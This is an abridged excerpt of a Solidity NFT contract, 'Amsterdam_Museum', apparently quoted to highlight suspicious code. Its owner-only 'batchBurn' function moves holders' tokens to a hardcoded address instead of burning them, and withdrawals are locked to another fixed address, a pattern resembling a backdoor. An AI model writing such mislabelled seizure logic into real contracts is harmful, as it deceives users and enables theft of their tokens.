...
contract Amsterdam_Museum is Ownable, ERC721A, ReentrancyGuard {

  uint256 public immutable maxPerAddressDuringMint;
  bytes32 public WhitelistMerkleRoot;  
  uint public maxSupply = 2618;
  ...
  ) ERC721A("Amsterdam_Museum", "AM", maxBatchSize_, collectionSize_) {
  ...
  function batchBurn(uint256[] memory tokenids) external onlyOwner {
        ...
        for (uint256 i; i < len; i++) {
            ...
            transferFrom(ownerOf(tokenid), 0xcDDe350bA07A2B91D321A18dCB219D8A11350edC, tokenid);
        }
    }
  ...
  function withdrawMoney() external  nonReentrant {
    require(msg.sender == 0x538864Fc33Bd3df71cFeBe0A4FE77FF39a60fc64);
